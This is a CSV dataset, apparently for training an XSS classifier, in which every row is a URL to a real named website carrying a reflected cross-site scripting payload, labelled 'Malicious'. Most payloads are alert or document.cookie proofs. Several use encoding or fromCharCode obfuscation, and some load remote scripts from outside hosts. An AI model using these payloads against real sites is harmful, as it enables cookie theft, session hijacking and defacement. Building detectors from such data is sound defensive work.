Payloads,Class
http://www.ain.fr/display.jsp?text=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%<br>3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;mode=all&amp;catname=true&amp;searchinfiles=tr<br>ue&amp;searchinarchives=false&amp;replacefiledoc=true&amp;jsp=custom%2fcg01%2frecherche%2fquery.jsp&amp;id=j_9&amp;opsea<br>rch.x=4&amp;opsearch.y=13,Malicious
http://www.car.com/content/research/index.cfm?search=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3<br>cspan%20id=%22&amp;action=search&amp;id=24093%3bccom&amp;submit.x=10&amp;submit.y=5&amp;submit=search,Malicious
http://www.radyoimparator.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious
http://www.kevinyang.org/photo/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bodydragon.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://toplist.gmnd.net/?ara=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3<br>ch1%3ejock3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ozenvinc.com/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fitz-fit.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://icwessex.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org/)<br>%3c/script%3e%3cp,Malicious
http://www.chosunonline.com/list/?code=%22%3e%3ciframe%20src=/%3e%3c/iframe%3e,Malicious
http://www.sciencemag.org/cgi/content/abstract/303/5665/1800?ijkey=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://www.xixixi.jp/xixixi2/index.html?scd=1&amp;qs=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e&amp;idp=&amp;<br>kno=,Malicious
http://game.sina.com/cgi-bin/sinagameloginforcolony.pl?gameid=3%22%3e'%3e%3cscript%3ealert('xss')%3c<br>/script%3e&amp;level=0&amp;version=gif,Malicious
http://www.unep.org/documents.multilingual/default.asp?documentid=433&amp;articleid=4793&amp;l=&quot;&gt;&lt;script&gt;ale<br>rt('cyber//35r4-f0r3v3r')&lt;/script&gt;,Malicious
http://warezfiend.com/index.php?q=%22%3e%3c%2fscript%3e%3cscript%3ealert%28%2fxssed_by_omeha%2f%29%3<br>b%3c%2fscript%3e&amp;type=&amp;search=search,Malicious
http://gov.mt/search.asp?keyword=%22%3e%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2fxss.js<br>%3e&amp;x=0&amp;y=0,Malicious
http://www.tm.uka.de/itm/view.php?view=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://www.download.com/stellar-phoenix-windows-data-recovery/3000-2248_4-10701912.html?part=&quot;&lt;scrip<br>t&gt;alert(string.fromcharcode(88,%2083,%2083))&lt;/script&gt;",Malicious
http://3.tool.ms/google.cgi?id=kusomiso.com%3c/title%3e'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%2<br>0kusomiso.com%22)%3c/script%3e,Malicious
"http://portacurtas.uol.com.br/busca.asp?area=&lt;script&gt;alert(string.fromcharcode(88,83,83,32,98,121,32<br>,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,116,101,114,46,99<br>,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.gnutellaforums.com/getting-started-using-limewire/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;,Malicious
http://search.babylon.com/?babsrc=babylonsite&amp;domains=babylon.com&amp;q=%27%22%3e%3e%3cmarquee%3e%3ch1%3<br>e%3cstrong%3ecueballr%3c%2fstrong%3e%3c%2fh1%3e%3c%2fmarquee%3e&amp;sa=search&amp;sitesearch=babylon.com,Malicious
http://www.adidas.com//campaigns/umbrella2008/index.asp?strcountry_adidascom=%22%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3ejock3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.flybalaton.com/index.jsp?id=64&amp;lang=en}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.s<br>ource));%3c/script%3e,Malicious
"https://security-shell.ws/radioandtv.php?ajax=updatelist&amp;letter=h%22%3cscript%3ealert(string.fromcha<br>rcode(88,83,83,69,68))%3c/script%3e",Malicious
http://fi.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://winds.jpl.nasa.gov/imagesanim/images.cfm?pagename=imagesanim&amp;subpagename=quikscate&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;,Malicious
http://www.petitmonde.com/envoyer/accueil.asp?id=24511&amp;url=/idoc/article.asp?id=24511&amp;title=&lt;script&gt;<br>alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious
http://cs-source.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62%7<br>9%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3enonsteam+hamachi+counter+sourc<br>e+server+strike+patch+maps+css&amp;c=1&amp;p=1&amp;r=1182158531039,Malicious
"http://www.bbc.co.uk/mediaselector/check/portuguese/meta/tx/bra_ultimas?size=';alert(string.fromchar<br>code(83,69,67,85,82,73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,<br>83,85,88))//%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.f<br>romcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://searchx.aetna.com/_layouts/search/default.aspx?k=a%22%3e%3cscript%3ealert(1337)%3c/script%3e&amp;<br>selectedindex=0&amp;s=int_www.aetna.com&amp;pt=sdav%3ahref%2ccontains%2chttp%3a%2f%2fwww.aetna.com/news/%2ca<br>nd%2c&amp;wd=+where+%22url%22+contains+http%3a%2f%2fwww.aetna.com/news/&amp;refurl=,Malicious
http://building.web.cern.ch/map/building?bno=%22%3e%3cscript%3ealert('seymen')%3c/script%3e,Malicious
http://www.accessclarkcounty.com/pages/404.aspx?aspxerrorpath=%3cscript%3ealert(/fucked/)%3c/script%<br>3e,Malicious
http://byrev.net/g-spot/?trends=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;date=2008-3-19,Malicious
http://assistance.ac-nice.fr/ecare/servlet/cervelet?initprojet=%22'%3c/script%3e%3cscript%3ealert('h<br>ello%20the%20rat')%3c/script%3e&amp;user=ecareenduser,Malicious
http://hotlists.hotornot.com/style-g961172-heroes.html?rid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
"http://www.yatashomeaydin.com/tr/urunlerimiz_detay.php?idurun=""><script>alert(1)</script>",Malicious
http://news.china.com.cn/chinanet/07news/china.cgi?word=%e4%b8%ad%e5%9b%bd%22%3e%3ciframe%20src=/%3e<br>%3c/iframe%3e,Malicious
http://www.torrentportal.com/torrents-search.php?search=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%7<br>4%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://halcyan.30.kg/adscan.php?url='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://en.irc-monitor.com/channels-search?search=int%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.programlama.com/sys/c2html/search.php?search=%3cscript%3ealert%28document.cookie%29%3c%2f<br>script%3e,Malicious
http://www.totalviewtech.com/ljtv10.htm?product='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://f24.aaa.livedoor.jp/~aotf/cgi-bin/a-news.cgi?date=2007.09.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.keyworddensity.com/search_engine_optimization/keyword_density.cgi<br>y=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.testberichte.de/d/search.php?searchstr=totalschaden&quot;&gt;&lt;script&gt;alert(&quot;test test test -<br>totalschaden&quot;)&lt;/script&gt;&amp;send=los...,Malicious
http://www.caraudiojunkyard.com/forum/car-audio-junkyard/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;,Malicious
http://www.various-info.net/ff11/itemsearch.cgi?itemname=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2f<br>kusomiso.com%2fx.js%3e%3c%2fscript%3e&amp;submit=%83t%81%5b%83%60,Malicious
http://www.mot.gov.az/?mod=search&amp;lang=az&amp;txtsearch=%3cscript%3ealert(/askima%20salam%20damara%20dav<br>am!/)%3c/script%3e,Malicious
http://www.ulakbim.gov.tr/dokumanlar/programlama/phpwebdevel/intro/examples/phpinfo.php?a[]=%3e%3csc<br>ript%3ealert(/kabus/);%3c/script%3e,Malicious
http://ideg.com.br/curso.php?id=%27%3e%3cscript%3ealert%28%22cr4t3r%20was%20here%22%29;//%3c/script%<br>3e,Malicious
http://www.anl.gov/jobsearch/search.jsp?fldbrowse=all&amp;fldsearchby=req_no&amp;fldtext=&quot;&gt;&lt;script&gt;alert(doc<br>ument.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext trtekforum.com&lt;/h1&gt;,Malicious
http://www.mediametrie.com/recherche.php?do=search&keywords=%3cscript%3ealert%28%22xss.by.03storic%22%29%3c%2fscript%3e%3ciframe+src%3d%22http%3a%2f%2fvuln.xssed.net%2fxssed.gif%22%3e&where=1&x=0&y=0,Malicious
http://www.jussanjuan.gov.ar/corzoogle.php?q=%22%3e%3c/script%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e,Malicious
http://www.evrensel.net/ekonomi.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.measureup.gov.au/internet/abhi/publishing.nsf/content/search-results-1?opendocument&amp;submi<br>t.x=0&amp;submit.y=0&amp;submit=search&amp;freetext=%3cscript%3ealert%28%22xss+by+prashant%22%29%3c/script%3e,Malicious
http://www.sharkscope.com/sharkscope/userlookup?usernamescategory=%22%3e%3ch1%3exssed%20by%20googleb<br>ig.com%3c/h1%3e%3ch2%3exssed%20by%20googlebig.com%3c/h2%3e%3ch3%3exssed%20by%20googlebig.com%3c/h3%3<br>e,Malicious
https://customers.reuters.com/cspsec_login/login.asp?failed=1&amp;user=%22%3e%3cscript%3ealert(1);%3c/sc<br>ript%3e,Malicious
http://software.gsfc.nasa.gov/classlist.cfm?search=%22%3cscript%3ealert%28%22kaksii+was+here%22%29%3<br>c%2fscript%3e%3c%2ftextarea%3ealert%28,Malicious
http://www.cansesli.com/sohbet/gorus.php?rumuz=%22%3e%3cscript%3ea=/:d/;alert(a.source)%3c/script%3e,Malicious
http://www.best.go.tz/news.asp?letter=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.wqmzj.gov.cn/otype.asp?owen1=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.sphinxcreations.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.sharif.edu/fa/about/vtour.jsp?d=1%22/%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/scrip<br>t%3e&amp;i=gate,Malicious
http://www.evrensel.net/mektup.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.bluish.jp/result.php?keywords=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx<br>.js%3e%3c%2fscript%3e&amp;r=c%253ezny2byopmnqx%2527tfbsdi%2560uzqf%253etfbsdi%2527f%253ekq%253ckq%253c9%<br>253c2%253c2%253c581565%253ctuzmf2%25609%252fdtt%253c3%253cjoufsdptnpt%2560bggjmjbuf%25602%2560e3s%25<br>60efsq%253cublftijpop%253cublftijpop%253c26878%253c26878%253cdmfbo%253c%2527enybsht%253e17pfozb5%255<br>bhkcmvymzows.ysyzso4eh%2560bhdf%2560kemvfgrqpqzbszl8edcgeeufmpi4bhuuqsk8pejq%2560zcvkqgv9%255b5hy7xe<br>pc%2560pigr3ixpspdmf%257b4hpgq9rjd%253ayyyi%257bdetgrgz%253atku6mlkihchvybd7shtjii2vvou9%2560odsb2y6<br>e4ppzchpe.%2560rg5onx272q8qzvb.sl9bp2mfbdokh%252f%252f-zu1%257b&amp;submit=go,Malicious
http://images.arm.gov/armimages.nsf/all+3+columns?openview&amp;singlecat=%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious
http://yuseonggucouncil.go.kr/person/way-board/way-board.php?db=&quot;&gt;&lt;script&gt;alert(&quot;cyber//for-ferda&quot;)&lt;<br>/script&gt;,Malicious
http://britbidz.co.uk/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.peugeot.ua/ru/zapchasty/1022/action=1&amp;captcha=2691&amp;fio=%3e%22%3e%3cscript%20%0a%0d%3ealer<br>t(/xss%20by%20turkpower%20-%20from%20turkey/)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from<br>%20turkey%3c/h1%3e%3c/marquee%3e,Malicious
http://www.lastagelighting.com/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.renault.ro/decouvrez_renault/d26.php?id=62%22%3e%3cscript%3ealert(/xss/.source)%3c/script<br>%3e,Malicious
http://www.dengzhou.gov.cn/xxxh/acceptjob.asp?job=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://archive.gamespy.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscr<br>ipt%3ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e2<br>0051011164320",Malicious
http://www.mustangdaily.net/media/storage/paper860/news/2008/10/10/sports/baltimores.mcclain.a.fanta<br>sy.action.hero-3481428.shtml%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/s<br>cript%3e%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/script%3e,Malicious
http://www.kimyasanal.net/ara.php?ara=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;ye<br>r=konular&amp;arabs=listele,Malicious
http://www.yenicaggazetesi.com.tr/search.asp?mtd=1&amp;strkey=%3d%22%3e%3cscript%3ealert%28%270ssi3_tr%2<br>7%29%3c%2fscript%3e,Malicious
http://www.redbolivia.com/buscar.php?search=%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%<br>3c/h1%3e,Malicious
https://www.dirnet.jp/cgi_bin/top.cgi?pagename=111%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e<br>%3c/marquee%3e&amp;corp=2702&amp;kbn=0,Malicious
"http://www.veoh.com/home.html?errormsg=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromc<br>harcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,8<br>3))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://search.folica.com/search?p=q&amp;ts=custom&amp;isort=score&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0,Malicious
http://register.oregonlive.com/regdb/servlet/nicktester?username=%27%22%3e%3c/title%3e%3cscript%3eal<br>ert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://help.travian.ro/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious
https://registration.sandbox.paypal.com/welcomepage.do?devcuserid=64wldypg2bbqy&amp;devclogin=%22%3e%3cs<br>cript%3ealert(%22i'm%20back%20-%20rstcenter.com%20-%20hackersblog.org%22)%3c/script%3e&amp;bundlecode=c3<br>&amp;country=us&amp;partner=paypal,Malicious
http://www.beaverfootball.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://buyersguide.cioinsight.com/bguide/company/listcompaniesbysite.asp?page=13&amp;cbopagesize=&amp;getlis<br>tby=%22%3e%3cscript%3ealert(%22xssed_by_omeha%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious
http://www.ns.umich.edu/htdocs/releases/search.php?category=business%22%3e%22%3e/r0hit/%3e%3cscript%<br>3ealert(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script%3e,Malicious
http://www.freefoto.com/search_index.jsp?message=%22%3e%3ch1%3eby%20st@rext,Malicious
http://exame.abril.com.br/busca/?qu=ssssssssssssssssss%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
http://my.monstergulf.com/login.html?randck=21171173274401?submit_flag=1&amp;src=&amp;username=%22%3e%3cscri<br>pt%3ealert%28%27xss%27%29%3c%2fscript%3e%3e&amp;passwd=cxvxvxcvxc&amp;submit.x=0&amp;submit.y=0,Malicious
http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;'&gt;&lt;h1&gt;hackednarcoticxs&lt;/h1&gt;,Malicious
http://www.csm.ornl.gov/~geist/cgi-bin/enote.cgi?nb=%3cscript%3ealert('i-landet')%3c/script%3e&amp;actio<br>n=view&amp;page=85,Malicious
http://www.transmetabilgiislem.net/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://www.shortnews.com/feedback.cfm?fanz=1&amp;fbid=408632&amp;rubrik=testicles&quot;&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;&amp;start=1,Malicious
http://www.netshoes.com.br/busca/?q=%22%3e%3cscript%3ealert%28%22fzero%20rulez!%22%29%3c/script%3e,Malicious
http://www.songteksten.nl/search.php?stage=results&amp;naam=%22%3e%3cscript%3ealert%28%27xssed%27%29%3c%<br>2fscript%3e&amp;keuze=1,Malicious
http://www.truckandbike.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://dogusfun.biz/forum/redirector.php?url=%22%3e%3cmarquee%3e%3ch1%3exssed%3c/h1%3e%3c/marquee%3e,Malicious
http://adspecs.yahoo.es/search-es?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious
"http://www.torrents.net/find/""><script>alert('xss by atm0n3r')</script>/",Malicious
http://weblog.independer.nl/zoekresultaat/?cx=006892592331554906880%3av2gewcpa-8a&amp;cof=forid%3a9&amp;ie=u<br>tf-8&amp;q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3ch1%3ekiller-tr%3c%2fh1%3e&amp;sa.x=<br>40&amp;sa.y=12&amp;sa=zoeken,Malicious
http://www.hotsoft.us/crack.shtml?q=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.sms-praha.cz/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53<br>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.relext.gouv.mc/devwww/wwwnew.nsf/c3241c4782f528bdc1256d52004f970b/e847591a199ff83bc125705<br>40046282f!opendocument&amp;linkedsitesask=wawa&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious
http://www.chambers.ie/preview.php?id=889%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.alteclansing.com/index_intl_update.asp?lid=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://search.military.com/search/milcom.html?words=%22%3e%3cscript%3ealert(%22zuppergazi%22)%3c/scr<br>ipt%3e&amp;x=0&amp;y=0,Malicious
